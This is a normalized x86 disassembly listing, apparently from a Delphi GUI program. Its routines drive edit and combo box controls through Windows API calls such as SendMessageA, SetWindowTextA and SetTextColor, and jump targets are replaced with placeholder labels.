mov eax [ ebx + 0x10 ]
call sub_4423cc
push eax
call SendMessageA
mov ecx eax
mov edx esp
mov eax edi
call sub_40404c
add esp 0x1000
pop edi
pop esi
pop ebx
retn
sub_4323c0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
push esi
push 0xbb
mov eax [ ebx + 0x10 ]
call sub_4423cc
push eax
call SendMessageA
mov esi eax
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
push 0x0
push esi
push 0xc1
mov eax [ ebx + 0x10 ]
call sub_4423cc
push eax
call SendMessageA
add eax esi
push eax
push esi
push 0xb1
mov eax [ ebx + 0x10 ]
call sub_4423cc
push eax
call SendMessageA
mov eax edi
call sub_40441c
push eax
push 0x0
push 0xc2
mov eax [ ebx + 0x10 ]
call sub_4423cc
push eax
call SendMessageA
sub_432434
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_43251f
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432526
lea eax [ ebp - 0x8 ]
call sub_403f5c
retn
push 0x0
push edi
push 0xbb
mov eax [ esi + 0x10 ]
call sub_4423cc
push eax
call SendMessageA
mov ebx eax
test ebx ebx
jl r-xdata
push 0x0
dec edi
push edi
push 0xbb
mov eax [ esi + 0x10 ]
call sub_4423cc
push eax
call SendMessageA
mov ebx eax
test ebx ebx
jl r-xdata
lea eax [ ebp - 0x8 ]
mov ecx r-xdata
mov edx [ ebp - 0x4 ]
call sub_404268
jmp r-xdata
push 0x0
push ebx
push 0xc1
mov eax [ esi + 0x10 ]
call sub_4423cc
push eax
call SendMessageA
test eax eax
je r-xdata
push ebx
push ebx
push 0xb1
mov eax [ esi + 0x10 ]
call sub_4423cc
push eax
call SendMessageA
mov eax [ ebp - 0x8 ]
call sub_40441c
push eax
push 0x0
push 0xc2
mov eax [ esi + 0x10 ]
call sub_4423cc
push eax
call SendMessageA
add ebx eax
lea eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
call sub_404268
sub_432533
inc [ edx ]
add [ eax ] al
add [ 0xa ] cl
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov edi edx
mov ebx eax
push 0x0
push edi
push 0xbb
mov eax [ ebx + 0x10 ]
call sub_4423cc
push eax
call SendMessageA
mov esi eax
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
push 0x0
inc edi
push edi
push 0xbb
mov eax [ ebx + 0x10 ]
call sub_4423cc
push eax
call SendMessageA
mov edi eax
test edi edi
jge r-xdata
push edi
push esi
push 0xb1
mov eax [ ebx + 0x10 ]
call sub_4423cc
push eax
call SendMessageA
mov eax [ rw-data ]
push eax
push 0x0
push 0xc2
mov eax [ ebx + 0x10 ]
call sub_4423cc
push eax
call SendMessageA
push 0x0
push esi
push 0xc1
mov eax [ ebx + 0x10 ]
call sub_4423cc
push eax
call SendMessageA
mov edi eax
add edi esi
sub_4325e0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
call sub_4426d0
test al al
je r-xdata
pop esi
pop ebx
retn
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_4423cc
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ esi + 0x10 ]
call sub_43cd98
mov eax [ esi + 0x10 ]
call sub_43c108
sub_432644
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43270d
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax esi
call sub_407c7c
mov eax [ ebp - 0x4 ]
call sub_40421c
mov esi eax
mov eax [ ebx + 0x10 ]
call sub_43bb40
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
push 0x0
push 0xc
mov eax [ ebx + 0x10 ]
call sub_4423cc
push eax
call SendMessageA
test eax eax
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x10 ]
call sub_43bbcc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_404368
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax [ ebx + 0x10 ]
call sub_43cd98
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3f0
call sub_403998
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432714
lea eax [ ebp - 0xc ]
call sub_403f5c
lea eax [ ebp - 0x8 ]
call sub_403f5c
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_43271c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4319ac
mov edx 0xb9
mov eax ebx
call sub_43b388
mov edx 0x59
mov eax ebx
call sub_43b3ac
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebx + 0x226 ] 0x1
mov [ ebx + 0x227 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov esi eax
mov [ ebx + 0x220 ] esi
mov [ esi + 0x10 ] ebx
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xbc ]
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_4327ac
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov eax [ esi + 0x220 ]
call sub_403224
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43e21c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_4327dc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_431e94
mov eax ebx
mov si 0xffc8
call sub_403420
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x224 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
xor ecx ecx
mov cl [ ebx + 0x226 ]
mov ecx [ ecx * 4 + rw-data ]
not ecx
and edx ecx
or edx 0x4
or eax edx
xor edx edx
mov dl [ ebx + 0x225 ]
or eax [ edx * 4 + rw-data ]
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
retn
sub_432840
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx r-xdata
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_4068bc
mov [ esi + 0x180 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ ebx + 0x5 ] 0x8
je r-xdata
mov eax [ ebx + 0x4 ]
and eax 0xfffff7ff
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx r-xdata
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_4068bc
mov edi eax
mov [ esi + 0x180 ] edi
test edi edi
je r-xdata
mov eax [ ebx ]
push eax
push 0x0
push 0xc
mov eax [ esi + 0x180 ]
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x1
push 0xcf
push edi
call SendMessageA
jmp r-xdata
sub_432909
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
push 0x0
push 0x0
push 0xb0
mov eax ebx
call sub_4423cc
push eax
call SendMessageA
shr eax 0x10
movzx eax ax
mov [ esi ] eax
push 0x0
mov eax [ esi ]
push eax
push 0xc9
mov eax ebx
call sub_4423cc
push eax
call SendMessageA
mov [ esi + 0x4 ] eax
push 0x0
push 0xffffffff
push 0xbb
mov eax ebx
call sub_4423cc
push eax
call SendMessageA
sub [ esi ] eax
pop esi
pop ebx
retn
sub_43296c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov eax [ esi + 0x4 ]
push eax
push 0xbb
mov eax ebx
call sub_4423cc
push eax
call SendMessageA
add eax [ esi ]
mov esi eax
push esi
push esi
push 0xb1
mov eax ebx
call sub_4423cc
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_432a14
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ ebx + 0x228 ] 0x0
je r-xdata
and [ esi + 0xc ] 0xfffffffd
or [ esi + 0xc ] 0x2
jmp r-xdata
pop esi
pop ebx
retn
and [ esi + 0xc ] 0xfffffffb
cmp [ ebx + 0x227 ] 0x0
jne r-xdata
sub_432a50
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4413b0
cmp [ esi ] 0xd
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x227 ] 0x0
jne r-xdata
mov [ esi ] 0x0
sub_432a90
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_432af6
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push edi
push 0x150
mov eax [ ebx + 0x10 ]
call sub_4423cc
push eax
call SendMessageA
mov esi eax
cmp esi 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432afd
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_4144e4
sub_432b08
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x151
mov eax [ ebx + 0x10 ]
call sub_4423cc
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_432b2c
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
push 0x0
push edi
push 0x149
mov eax [ ebx + 0x10 ]
call sub_4423cc
push eax
call SendMessageA
cmp eax 0xffffffff
je r-xdata
mov eax esi
xor edx edx
call sub_4045a8
mov edx esi
xchg edx eax
call sub_4045a8
mov eax [ esi ]
call sub_40441c
push eax
push edi
push 0x148
mov eax [ ebx + 0x10 ]
call sub_4423cc
push eax
call SendMessageA
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_432b84
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_432be8
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_43bbcc
push 0x0
push 0x0
push 0x14b
mov eax [ ebx + 0x10 ]
call sub_4423cc
push eax
call SendMessageA
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_43bbfc
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x88 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432bef
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_432bf4
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x144
mov eax [ ebx + 0x10 ]
call sub_4423cc
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_432c14
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_40441c
push eax
push 0xffffffff
push 0x158
mov eax [ ebx + 0x10 ]
call sub_4423cc
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_432c3c
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_4423cc
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x10 ]
call sub_43c108
sub_432c70
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_432ce3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_40441c
push eax
push 0x0
push 0x143
mov eax [ ebx + 0x10 ]
call sub_4423cc
push eax
call SendMessageA
mov ebx eax
test ebx ebx
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432cea
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3f0
call sub_403998
sub_432cf4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_432d67
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_40441c
push eax
push esi
push 0x14a
mov eax [ ebx + 0x10 ]
call sub_4423cc
push eax
call SendMessageA
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432d6e
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3f0
call sub_403998
sub_432d74
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43e0f8
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x91
mov eax ebx
call sub_43b388
mov edx 0x19
mov eax ebx
call sub_43b3ac
mov dl 0x1
mov eax ebx
call sub_442600
xor edx edx
mov eax ebx
call sub_43bd90
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cde0
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_43a7a8
mov [ ebx + 0x238 ] 0x10
push ebx
push sub_4330d8
call sub_41a480
mov [ ebx + 0x24c ] eax
push ebx
push sub_4331d0
call sub_41a480
mov [ ebx + 0x254 ] eax
mov [ ebx + 0x210 ] 0x8
mov [ ebx + 0x214 ] 0xffffffff
mov [ ebx + 0x260 ] 0xffffffff
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_432e68
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov eax esi
call sub_4426d0
test al al
je r-xdata
mov eax [ esi + 0x254 ]
call sub_45282c
mov eax [ esi + 0x24c ]
call sub_45282c
mov eax [ esi + 0x208 ]
call sub_403224
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43e21c
test bl bl
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xac ]
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_432eea
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
call sub_43f7c0
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
xor eax eax
mov [ ebx + 0x248 ] eax
pop ebx
retn
sub_432f34
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x157
mov eax ebx
call sub_4423cc
push eax
call SendMessageA
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_432f58
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
push 0x0
xor eax eax
mov al bl
push eax
push 0x14f
mov eax esi
call sub_4423cc
push eax
call SendMessageA
mov edx esp
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax esi
call sub_4423cc
push eax
call InvalidateRect
add esp 0x10
pop esi
pop ebx
retn
sub_432fa0
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
push 0x0
push 0x0
push 0x147
mov eax ebx
call sub_4423cc
push eax
call SendMessageA
pop ebx
retn
mov eax [ ebx + 0x214 ]
pop ebx
retn
sub_432fcc
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp esi eax
je r-xdata
mov [ ebx + 0x214 ] esi
pop esi
pop ebx
retn
pop esi
pop ebx
retn
push 0x0
push esi
push 0x14e
mov eax ebx
call sub_4423cc
push eax
call SendMessageA
sub_433018
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x64 ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0x64 ]
push eax
mov eax esi
call sub_4423cc
push eax
call SetWindowTextA
sub_433054
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_432f34
test al al
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0xc ] 0x4
sub_43308c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4419e4
pop esi
pop ebx
retn
mov eax ebx
call sub_43f96c
sub_4330b0
push ebx
mov ebx eax
mov eax ebx
call sub_43d7bc
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x276 ] 0x2
jae r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4330d8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ esi ] 0x112
jne r-xdata
mov eax [ esi ]
cmp eax 0x100
jb r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
jmp r-xdata
mov eax [ ebx + 0x250 ]
push eax
mov edx esi
mov ecx [ ebx + 0x240 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xf4 ]
mov eax [ esi ]
sub eax 0x30
je r-xdata
cmp eax 0x108
ja r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
sub eax 0x1d1
je r-xdata
mov eax ebx
call sub_452980
mov edi eax
test edi edi
je r-xdata
push 0x0
push 0x3
push 0xd3
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
sub eax 0x2
jne r-xdata
mov ecx esi
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax ebx
call sub_43b710
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_40688c
push eax
push 0x0
push 0x202
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_43c28c
jmp r-xdata
sub_4331f0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4334a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x104
jg r-xdata
cmp eax 0xbd00
jg r-xdata
je r-xdata
sub eax 0xbd02
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp esi [ eax + 0x244 ]
je r-xdata
cmp eax 0x87
jg r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0x2
je r-xdata
sub eax 0x105
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
push esi
mov eax [ ebp + 0x8 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
cmp [ ebx ] 0x203
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_441220
test al al
je r-xdata
sub eax 0x100
je r-xdata
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub eax 0x2
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_441308
test al al
je r-xdata
sub eax 0xfb
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x80
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_432f34
test al al
je r-xdata
sub eax 0x7
je r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45c12c
jmp r-xdata
sub eax 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffe9
call sub_403420
dec eax
je r-xdata
mov [ ebx + 0xc ] 0x4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_452980
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_430bf4
test al al
je r-xdata
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4413d0
test al al
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
je r-xdata
sub eax 0x7c
je r-xdata
movsx eax [ ebx + 0x8 ]
mov [ ebp - 0xc ] eax
movsx eax [ ebx + 0xa ]
mov [ ebp - 0x8 ] eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
push esi
call MapWindowPoints
mov ax [ ebp - 0xc ]
mov [ ebx + 0x8 ] ax
mov ax [ ebp - 0x8 ]
mov [ ebx + 0xa ] ax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov di [ ebx + 0x4 ]
cmp di 0xd
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_432f34
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov [ ebx + 0xc ] 0xffffffff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_432f58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4334cc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ esi ]
sub eax 0x5
je r-xdata
mov edi [ esi ]
cmp edi 0x201
je r-xdata
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub eax 0xfd
je r-xdata
mov eax ebx
call sub_43c354
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
mov edx esi
mov eax ebx
call sub_43fde0
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov edx esi
mov eax ebx
call sub_4413d0
test al al
jne r-xdata
add eax 0xffffffd0
sub eax 0x7
jb r-xdata
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
cmp di 0xd
je r-xdata
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_41bfbc
push eax
mov eax [ esi + 0x4 ]
push eax
call SetTextColor
mov eax [ ebx + 0x170 ]
call sub_41cc88
call sub_41bfbc
push eax
mov eax [ esi + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0x170 ]
call sub_41ccc4
mov [ esi + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov edx esi
mov eax ebx
call sub_43fd4c
test al al
jne r-xdata
mov eax ebx
call sub_432f34
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
xor edx edx
mov eax ebx
call sub_432f58
jmp r-xdata
sub_4335da
add [ eax ] al
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_433738
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ edx + 0x6 ]
cmp eax 0x8
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43373f
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
jmp [ eax * 4 + jump_table_433608 ]
mov eax edi
mov si 0xffe9
call sub_403420
jmp r-xdata
mov eax edi
mov si 0xffb3
call sub_403420
jmp r-xdata
mov [ edi + 0x25d ] 0x0
mov eax edi
mov si 0xffb1
call sub_403420
mov eax edi
mov edx [ eax ]
call [ edx + 0xf0 ]
cmp [ edi + 0x25d ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ edi + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_43bbfc
mov eax edi
mov si 0xffeb
call sub_403420
mov eax edi
mov si 0xffb2
call sub_403420
jmp r-xdata
mov eax edi
mov si 0xffb0
call sub_403420
jmp r-xdata
mov [ edi + 0x25e ] 0x1
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_440b50
jmp r-xdata
mov [ edi + 0x25e ] 0x0
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_440c3c
push 0x0
push 0x0
push 0x1f
mov eax edi
call sub_4423cc
push eax
call PostMessageA
cmp [ edi + 0x25e ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x14f
mov eax edi
call sub_4423cc
push eax
call PostMessageA
jmp r-xdata
sub_43376c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_433815
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x208 ]
call sub_43a7c0
cmp [ ebx + 0x282 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x208 ]
call sub_41d034
test esi esi
jl r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x284 ]
call [ ebx + 0x280 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43381c
lea eax [ ebp - 0x14 ]
call sub_403f5c
retn
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebx + 0x23c ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x10 ]
add edx 0x2
mov ecx [ ebp - 0xc ]
mov eax [ ebx + 0x208 ]
call sub_41d220
sub_433848
push esi
push edi
mov esi eax
mov eax esi
call sub_43dca0
mov edi [ esi + 0x214 ]
cmp edi 0xffffffff
je r-xdata
pop edi
pop esi
retn
